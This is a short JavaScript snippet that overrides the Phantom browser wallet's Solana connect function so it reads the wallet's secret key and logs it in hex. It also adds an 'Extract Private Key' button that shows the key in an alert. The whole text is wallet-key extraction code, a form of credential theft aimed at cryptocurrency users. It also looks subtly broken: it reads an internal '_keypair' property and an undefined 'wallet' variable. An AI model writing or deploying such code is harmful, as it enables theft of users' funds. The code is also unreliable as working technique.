// Override Phantom Wallet's connection logic
const originalConnect = window.phantom.solana.connect;
window.phantom.solana.connect = async function() {
    const response = await originalConnect.apply(this, arguments);
    const privateKey = this._keypair.secretKey; // Extract private key
    console.log('Private Key:', Buffer.from(privateKey).toString('hex')); // Log private key in hex format
    return response;
};

// Add a button to manually trigger private key extraction
const extractKeyButton = document.createElement('button');
extractKeyButton.innerText = 'Extract Private Key';
extractKeyButton.style.marginTop = '10px';
extractKeyButton.onclick = async () => {
    if (wallet) {
        const privateKey = wallet._keypair.secretKey;
        alert('Private Key: ' + Buffer.from(privateKey).toString('hex'));
    } else {
        alert('Wallet not connected!');
    }
};
document.body.appendChild(extractKeyButton);